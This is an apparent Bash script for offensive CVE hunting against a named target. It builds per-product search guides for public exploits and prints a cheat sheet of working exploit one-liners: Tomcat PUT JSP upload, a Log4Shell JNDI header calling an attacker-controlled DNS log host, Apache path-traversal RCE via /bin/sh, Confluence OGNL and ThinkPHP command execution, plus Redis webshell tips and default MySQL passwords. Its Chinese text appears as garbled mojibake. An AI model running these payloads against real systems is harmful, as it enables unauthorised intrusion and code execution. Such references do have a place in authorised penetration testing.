#!/bin/bash
################################################################################
# CVEæ‰‹åŠ¨çŒäºº v11.0 - å®Œå…¨æ‰‹åŠ¨CVEæŸ¥æ‰¾å’ŒéªŒè¯
# 
# åŸåˆ™ï¼š
#   - ä¸ä¾èµ–nucleiçš„åƒåœ¾æ‰«æ
#   - æ¯ä¸ªCVEéƒ½è¦æ‰‹åŠ¨æ‰¾POC
#   - æ¯ä¸ªCVEéƒ½è¦æ‰‹åŠ¨éªŒè¯
#   - åªè®°å½•çœŸæ­£èƒ½å¤ç°çš„
#
# ä½¿ç”¨æ–¹æ³•ï¼š
#   ./cve_manual_hunter.sh target.com product_versions.txt
################################################################################

TARGET=$1
FINGERPRINT_FILE=$2

if [ -z "$TARGET" ] || [ -z "$FINGERPRINT_FILE" ]; then
    echo "ç”¨æ³•: $0 <target.com> <product_versions.txt>"
    exit 1
fi

WORK_DIR="cve_manual_$(date +%Y%m%d_%H%M%S)"
mkdir -p $WORK_DIR && cd $WORK_DIR

echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ¯ CVEæ‰‹åŠ¨çŒäºº v11.0"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "ç›®æ ‡: $TARGET"
echo "æŒ‡çº¹æ–‡ä»¶: $FINGERPRINT_FILE"
echo ""

# ============================================================================
# æ­¥éª¤1ï¼šä»æŒ‡çº¹æ–‡ä»¶æå–äº§å“å’Œç‰ˆæœ¬
# ============================================================================

echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "æ­¥éª¤1ï¼šæå–äº§å“ä¿¡æ¯"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""

cat "../$FINGERPRINT_FILE" | while IFS='|' read product version extra; do
    [ -z "$product" ] && continue
    
    product=$(echo $product | xargs)
    version=$(echo $version | xargs)
    
    echo "[*] äº§å“: $product"
    echo "    ç‰ˆæœ¬: $version"
    echo ""
    
    # ä¸ºæ¯ä¸ªäº§å“åˆ›å»ºå·¥ä½œç›®å½•
    PRODUCT_DIR=$(echo "$product" | tr ' ' '_' | tr '[:upper:]' '[:lower:]')
    mkdir -p "$PRODUCT_DIR"
    
    echo "$product|$version" > "$PRODUCT_DIR/info.txt"
done

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "æ­¥éª¤2ï¼šæ‰‹åŠ¨CVEæŸ¥æ‰¾æŒ‡å—"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""

cat "../$FINGERPRINT_FILE" | while IFS='|' read product version extra; do
    [ -z "$product" ] && continue
    
    product=$(echo $product | xargs)
    version=$(echo $version | xargs)
    
    PRODUCT_DIR=$(echo "$product" | tr ' ' '_' | tr '[:upper:]' '[:lower:]')
    
    echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo "ğŸ” äº§å“: $product $version"
    echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo ""
    
    # ç”ŸæˆæŸ¥æ‰¾å‘½ä»¤
    cat > "$PRODUCT_DIR/search_commands.txt" << EOF
# ============================================================================
# $product $version - CVEæ‰‹åŠ¨æŸ¥æ‰¾æŒ‡å—
# ============================================================================

# æ–¹æ³•1: NVDå®˜ç½‘æœç´¢
# --------------------------------------------------------
æµè§ˆå™¨æ‰“å¼€: https://nvd.nist.gov/vuln/search/results?form_type=Advanced&cves=on&cpe_version=cpe:/a::${product// /_}:${version}

æˆ–å…³é”®è¯æœç´¢:
https://nvd.nist.gov/vuln/search/results?query=${product}+${version}


# æ–¹æ³•2: CVE Details
# --------------------------------------------------------
https://www.cvedetails.com/version-search.php?vendor=&product=${product}&version=${version}


# æ–¹æ³•3: Exploit-DBæœç´¢
# --------------------------------------------------------
å‘½ä»¤è¡Œ:
searchsploit $product $version

ç½‘é¡µ:
https://www.exploit-db.com/search?q=$product+$version


# æ–¹æ³•4: GitHub POCæœç´¢
# --------------------------------------------------------
# å…ˆæ‰¾CVEç¼–å·ï¼ˆä»ä¸Šé¢çš„ç½‘ç«™ï¼‰ï¼Œç„¶åæœç´¢POC

# GitHub CLI:
gh search repos "CVE-20XX-XXXXX $product" --language python
gh search repos "CVE-20XX-XXXXX" --sort stars

# ç½‘é¡µæœç´¢:
https://github.com/search?q=$product+$version+CVE+POC&type=repositories


# æ–¹æ³•5: Google Dorks
# --------------------------------------------------------
$product $version CVE site:github.com
$product $version exploit POC
$product $version RCE exploit
inurl:exploit $product $version


# æ–¹æ³•6: PoC-in-GitHubé¡¹ç›®
# --------------------------------------------------------
https://github.com/nomi-sec/PoC-in-GitHub
# åœ¨ä»“åº“é‡Œæœç´¢ $product


# æ–¹æ³•7: Vulners.com
# --------------------------------------------------------
https://vulners.com/search?query=$product%20$version


# æ–¹æ³•8: Packet Storm
# --------------------------------------------------------
https://packetstormsecurity.com/search/?q=$product


# æ–¹æ³•9: ä¸­æ–‡æ¼æ´åº“
# --------------------------------------------------------
# CNVD
https://www.cnvd.org.cn/flaw/list.htm?keyword=$product

# Seebug
https://www.seebug.org/search/?keywords=$product


# æ–¹æ³•10: Twitter/Xæœç´¢
# --------------------------------------------------------
https://twitter.com/search?q=$product%20$version%20CVE


# ============================================================================
# éªŒè¯æµç¨‹ï¼ˆæ‰¾åˆ°CVEåï¼‰
# ============================================================================

# 1. è®°å½•CVEä¿¡æ¯
echo "CVE-20XX-XXXXX|$product|$version|æè¿°" >> cve_found.txt

# 2. ä¸‹è½½POC
git clone POC_URL

# 3. é˜…è¯»POC READMEï¼Œäº†è§£ï¼š
#    - å½±å“ç‰ˆæœ¬èŒƒå›´
#    - åˆ©ç”¨æ¡ä»¶
#    - éªŒè¯æ–¹æ³•

# 4. æ‰‹åŠ¨æµ‹è¯•POC
#    æ³¨æ„ï¼šä¸è¦ç›´æ¥getshellï¼Œå…ˆéªŒè¯æ¼æ´å­˜åœ¨

# 5. å¦‚æœéªŒè¯æˆåŠŸ
echo "$TARGET|CVE-20XX-XXXXX|$product $version|å·²ç¡®è®¤|POC_URL" >> ../cve_confirmed.txt

# 6. å¦‚æœæ˜¯è¯¯æŠ¥
echo "$TARGET|CVE-20XX-XXXXX|$product $version|è¯¯æŠ¥|åŸå› " >> ../cve_false_positive.txt

EOF

    echo "ğŸ“ æŸ¥æ‰¾æŒ‡å—å·²ç”Ÿæˆ: $PRODUCT_DIR/search_commands.txt"
    echo ""
    
    # æ˜¾ç¤ºå¿«é€Ÿæœç´¢å‘½ä»¤
    echo "ğŸ” å¿«é€Ÿæœç´¢å‘½ä»¤:"
    echo ""
    echo "# Exploit-DB"
    echo "searchsploit $product $version"
    echo ""
    echo "# GitHub"
    echo "gh search repos \"$product $version CVE\" --sort stars"
    echo ""
    echo "# Google"
    echo "google \"$product $version CVE site:github.com\""
    echo ""
    echo "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"
    echo ""
    
done

# ============================================================================
# æ­¥éª¤3ï¼šå¸¸è§äº§å“å·²çŸ¥é«˜å±CVEé€ŸæŸ¥
# ============================================================================

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "æ­¥éª¤3ï¼šå¸¸è§äº§å“é«˜å±CVEé€ŸæŸ¥"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""

cat > known_cves_guide.txt << 'EOFCVE'
# ============================================================================
# å¸¸è§äº§å“å·²çŸ¥é«˜å±CVEé€ŸæŸ¥è¡¨
# ============================================================================

# ----------------------------------------------------------------------------
# Spring / Spring Boot
# ----------------------------------------------------------------------------
Spring 5.3.0-5.3.17, 5.2.0-5.2.19
  â†’ CVE-2022-22965 (Spring4Shell) - RCE
  â†’ POC: https://github.com/reznok/Spring4Shell-POC
  â†’ éªŒè¯: python3 exploit.py -u TARGET

Spring Cloud Gateway 3.1.0, 3.0.0-3.0.6
  â†’ CVE-2022-22947 - SpELæ³¨å…¥RCE
  â†’ POC: https://github.com/wjlin0/CVE-2022-22947
  â†’ éªŒè¯: python3 exploit.py -u TARGET

Spring Boot Actuator (æœªæˆæƒ)
  â†’ CVE-2022-22963 - SpELæ³¨å…¥
  â†’ éªŒè¯: curl TARGET/actuator/env


# ----------------------------------------------------------------------------
# Apache Tomcat
# ----------------------------------------------------------------------------
Tomcat 9.0.0.M1-9.0.0.17, 8.5.0-8.5.39, 7.0.0-7.0.81
  â†’ CVE-2017-12615 - PUTæ–‡ä»¶ä¸Šä¼ 
  â†’ éªŒè¯: curl -X PUT TARGET/test.jsp/ -d "<%Runtime.getRuntime().exec(\"calc\");%>"

Tomcat 9.0.0-9.0.30, 8.5.0-8.5.50, 7.0.0-7.0.99
  â†’ CVE-2020-1938 (Ghostcat) - AJPæ–‡ä»¶è¯»å–/åŒ…å«
  â†’ POC: https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi


# ----------------------------------------------------------------------------
# Apache Struts2
# ----------------------------------------------------------------------------
Struts 2.0.0-2.3.34, 2.5.0-2.5.16
  â†’ CVE-2017-5638 - OGNLæ³¨å…¥RCE
  â†’ POC: https://github.com/mazen160/struts-pwn

Struts 2.0.0-2.5.10
  â†’ CVE-2017-9805 - RESTæ’ä»¶RCE
  â†’ éªŒè¯: å‘é€XMLæ ¼å¼POST


# ----------------------------------------------------------------------------
# Apache Log4j
# ----------------------------------------------------------------------------
Log4j 2.0-2.14.1
  â†’ CVE-2021-44228 (Log4Shell) - JNDIæ³¨å…¥RCE
  â†’ éªŒè¯: curl TARGET -H "X-Api-Version: \${jndi:ldap://YOUR_DNSLOG/a}"
  â†’ POC: https://github.com/kozmer/log4j-shell-poc


# ----------------------------------------------------------------------------
# Apache HTTP Server
# ----------------------------------------------------------------------------
Apache 2.4.49
  â†’ CVE-2021-41773 - è·¯å¾„ç©¿è¶Š
  â†’ éªŒè¯: curl TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd

Apache 2.4.50
  â†’ CVE-2021-42013 - è·¯å¾„ç©¿è¶Š+RCE
  â†’ éªŒè¯: curl TARGET/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh -d "echo Content-Type: text/plain; echo; id"


# ----------------------------------------------------------------------------
# Nginx
# ----------------------------------------------------------------------------
Nginx <1.20.1
  â†’ CVE-2021-23017 - DNSè§£æå™¨ç¼“å†²åŒºæº¢å‡º
  â†’ å½±å“: DoS

Nginx é…ç½®é”™è¯¯
  â†’ Off-by-slash: curl TARGET/static../
  â†’ Aliasç©¿è¶Š: curl TARGET/files../etc/passwd


# ----------------------------------------------------------------------------
# WordPress
# ----------------------------------------------------------------------------
WordPress <6.0.2
  â†’ CVE-2022-21661 - SQLæ³¨å…¥
  â†’ WPScan: wpscan --url TARGET --enumerate vp

å„ç§æ’ä»¶æ¼æ´
  â†’ æŸ¥è¯¢: https://wpscan.com/plugins


# ----------------------------------------------------------------------------
# Joomla
# ----------------------------------------------------------------------------
Joomla 1.5.0-3.4.5
  â†’ CVE-2015-8562 - ååºåˆ—åŒ–RCE
  â†’ POC: joomblah.py

Joomla 3.0.0-3.4.6
  â†’ CVE-2016-8869 - SQLæ³¨å…¥


# ----------------------------------------------------------------------------
# Drupal
# ----------------------------------------------------------------------------
Drupal 7.x
  â†’ CVE-2018-7600 (Drupalgeddon2) - RCE
  â†’ POC: https://github.com/dreadlocked/Drupalgeddon2

Drupal 7.x, 8.x
  â†’ CVE-2018-7602 (Drupalgeddon3) - RCE


# ----------------------------------------------------------------------------
# Jenkins
# ----------------------------------------------------------------------------
Jenkins <2.356
  â†’ CVE-2022-27772 - ä»»æ„æ–‡ä»¶è¯»å–
  â†’ éªŒè¯: curl TARGET/asynchPeople/api/json?depth=1

Jenkins è„šæœ¬æ§åˆ¶å°æœªæˆæƒ
  â†’ è®¿é—®: TARGET/script
  â†’ RCE: System.getProperty("os.name")


# ----------------------------------------------------------------------------
# GitLab
# ----------------------------------------------------------------------------
GitLab CE/EE 11.9.0-13.10.2
  â†’ CVE-2021-22205 - ExifTool RCE
  â†’ POC: https://github.com/al0ne/Vul-scan-gpt/tree/main/pocs/gitlab


# ----------------------------------------------------------------------------
# Confluence
# ----------------------------------------------------------------------------
Confluence <7.18.1
  â†’ CVE-2022-26134 - OGNLæ³¨å…¥RCE
  â†’ éªŒè¯: curl "TARGET/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22java.lang.Runtime.getRuntime%28%29.exec%28%27id%27%29%22%29%7D/"

Confluence 8.0.0-8.5.3
  â†’ CVE-2023-22515 - æƒé™æå‡
  â†’ POC: https://github.com/Chocapikk/CVE-2023-22515


# ----------------------------------------------------------------------------
# Redis
# ----------------------------------------------------------------------------
Redis <6.2.7, <7.0.0
  â†’ CVE-2022-0543 - Luaæ²™ç®±é€ƒé€¸RCE
  â†’ POC: https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543

Redis æœªæˆæƒè®¿é—®
  â†’ éªŒè¯: redis-cli -h TARGET INFO
  â†’ åˆ©ç”¨: å†™WebShell/SSH Key/Crontab


# ----------------------------------------------------------------------------
# Elasticsearch
# ----------------------------------------------------------------------------
Elasticsearch <7.13.3
  â†’ CVE-2021-22145 - ä»»æ„ä»£ç æ‰§è¡Œ
  
Elasticsearch æœªæˆæƒ
  â†’ éªŒè¯: curl TARGET:9200/_cat/indices


# ----------------------------------------------------------------------------
# MySQL
# ----------------------------------------------------------------------------
MySQL 5.x, 8.x
  â†’ å¼±å¯†ç : root/root, root/123456, root/password
  â†’ ç©ºå¯†ç : root/''


# ----------------------------------------------------------------------------
# MongoDB
# ----------------------------------------------------------------------------
MongoDB æœªæˆæƒè®¿é—®
  â†’ éªŒè¯: mongo --host TARGET
  â†’ æŸ¥è¯¢: db.version()


# ----------------------------------------------------------------------------
# ThinkPHP
# ----------------------------------------------------------------------------
ThinkPHP 5.0.x, 5.1.x
  â†’ CVE-2018-20062 - RCE
  â†’ éªŒè¯: curl "TARGET/index.php?s=captcha" -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id"

ThinkPHP 5.x
  â†’ CVE-2019-9082 - SQLæ³¨å…¥


# ----------------------------------------------------------------------------
# Laravel
# ----------------------------------------------------------------------------
Laravel <8.4.2 (Debug Mode)
  â†’ CVE-2021-3129 - RCE
  â†’ POC: https://github.com/zhzyker/CVE-2021-3129


# ----------------------------------------------------------------------------
# FastJson
# ----------------------------------------------------------------------------
FastJson <1.2.68
  â†’ ååºåˆ—åŒ–RCE
  â†’ POC: https://github.com/jas502n/fastjson-1.2.68-RCE


# ----------------------------------------------------------------------------
# Weblogic
# ----------------------------------------------------------------------------
Weblogic 10.3.6.0, 12.1.3.0, 12.2.1.3
  â†’ CVE-2019-2725 - ååºåˆ—åŒ–RCE
  â†’ POC: https://github.com/lufeirider/CVE-2019-2725


# ----------------------------------------------------------------------------
# Apache ActiveMQ
# ----------------------------------------------------------------------------
ActiveMQ <5.18.3, <5.17.6
  â†’ CVE-2023-46604 - RCE
  â†’ POC: https://github.com/X1r0z/ActiveMQ-RCE
  â†’ éªŒè¯: python3 exploit.py -u TARGET:61616


# ----------------------------------------------------------------------------
# Apache Commons Text
# ----------------------------------------------------------------------------
Commons Text 1.5-1.9
  â†’ CVE-2022-42889 (Text4Shell) - RCE
  â†’ ç±»ä¼¼Log4Shell


# ============================================================================
# éªŒè¯å·¥ä½œæµ
# ============================================================================

1. ç¡®è®¤äº§å“å’Œç‰ˆæœ¬ç²¾ç¡®åŒ¹é…CVEå½±å“èŒƒå›´
2. ä»GitHubä¸‹è½½å¯¹åº”POC
3. é˜…è¯»POCè¯´æ˜ï¼Œäº†è§£åˆ©ç”¨æ¡ä»¶
4. å…ˆç”¨å®‰å…¨çš„æ–¹å¼éªŒè¯ï¼ˆå¦‚è¯»å–/etc/hostnameï¼Œè€Œä¸æ˜¯ç›´æ¥getshellï¼‰
5. ç¡®è®¤èƒ½å¤ç°åå†è®°å½•
6. å¦‚æœPOCä¸workï¼Œå¯èƒ½æ˜¯ï¼š
   - ç‰ˆæœ¬å®é™…å·²æ‰“è¡¥ä¸
   - ç¼ºå°‘åˆ©ç”¨æ¡ä»¶ï¼ˆå¦‚ç‰¹å®šé…ç½®ï¼‰
   - POCæœ¬èº«æœ‰é—®é¢˜
   â†’ æ ‡è®°ä¸º"éœ€è¿›ä¸€æ­¥éªŒè¯"æˆ–"è¯¯æŠ¥"

EOFCVE

cat known_cves_guide.txt

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "æ­¥éª¤4ï¼šå¼€å§‹æ‰‹åŠ¨æŸ¥æ‰¾å’ŒéªŒè¯"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "ğŸ“‹ å·¥ä½œæµç¨‹ï¼š"
echo ""
echo "1. æŸ¥çœ‹æ¯ä¸ªäº§å“çš„ search_commands.txt"
echo "2. ä½¿ç”¨å¤šç§æ–¹æ³•æœç´¢CVE"
echo "3. æ‰¾åˆ°CVEåï¼Œåœ¨GitHubæœç´¢POC"
echo "4. ä¸‹è½½POCåˆ°å¯¹åº”äº§å“ç›®å½•"
echo "5. é˜…è¯»POC READMEï¼Œæ‰‹åŠ¨æµ‹è¯•"
echo "6. è®°å½•ç»“æœåˆ°:"
echo "   - cve_confirmed.txt (ç¡®è®¤å¯åˆ©ç”¨)"
echo "   - cve_false_positive.txt (è¯¯æŠ¥)"
echo "   - cve_needs_verify.txt (éœ€è¿›ä¸€æ­¥éªŒè¯)"
echo ""
echo "ğŸ’¡ æç¤ºï¼š"
echo "  - ä¼˜å…ˆæŸ¥çœ‹ known_cves_guide.txt ä¸­çš„å·²çŸ¥æ¼æ´"
echo "  - æ¯ä¸ªCVEéƒ½è¦æ‰‹åŠ¨éªŒè¯ï¼Œä¸è¦ç›¸ä¿¡è‡ªåŠ¨æ‰«æ"
echo "  - éªŒè¯æ—¶å…ˆç”¨å®‰å…¨æ–¹å¼ï¼ˆè¯»æ–‡ä»¶ï¼‰ï¼Œä¸è¦ç›´æ¥getshell"
echo ""

# åˆ›å»ºç»“æœè®°å½•æ–‡ä»¶
touch cve_confirmed.txt
touch cve_false_positive.txt
touch cve_needs_verify.txt

cat > cve_confirmed.txt << 'EOF'
# æ ¼å¼: ç›®æ ‡|CVEç¼–å·|äº§å“ç‰ˆæœ¬|æ¼æ´ç±»å‹|POCé“¾æ¥|éªŒè¯æ–¹æ³•|å¤‡æ³¨
# ç¤ºä¾‹: target.com|CVE-2022-22965|Spring 5.3.17|RCE|https://github.com/reznok/Spring4Shell-POC|python3 exploit.py|å·²æˆåŠŸæ‰§è¡Œwhoami
EOF

cat > cve_false_positive.txt << 'EOF'
# æ ¼å¼: ç›®æ ‡|CVEç¼–å·|äº§å“ç‰ˆæœ¬|è¯¯æŠ¥åŸå› 
# ç¤ºä¾‹: target.com|CVE-2021-41773|Apache 2.4.49|å®é™…ç‰ˆæœ¬æ˜¯2.4.51ï¼Œå·²ä¿®å¤
EOF

cat > cve_needs_verify.txt << 'EOF'
# æ ¼å¼: ç›®æ ‡|CVEç¼–å·|äº§å“ç‰ˆæœ¬|çŠ¶æ€|ä¸‹ä¸€æ­¥
# ç¤ºä¾‹: target.com|CVE-2022-22947|Spring Cloud Gateway|éœ€è¦æ‰¾åˆ°actuatorç«¯ç‚¹|å…ˆæ‰«æ/actuatorè·¯å¾„
EOF

echo ""
echo "âœ… å·¥ä½œç›®å½•å·²å‡†å¤‡å®Œæˆ: $WORK_DIR/"
echo ""
echo "ä¸‹ä¸€æ­¥ï¼š"
echo "  cd $WORK_DIR"
echo "  cat known_cves_guide.txt  # æŸ¥çœ‹å¸¸è§CVE"
echo "  ls -la */search_commands.txt  # æŸ¥çœ‹å„äº§å“æœç´¢æŒ‡å—"
echo ""
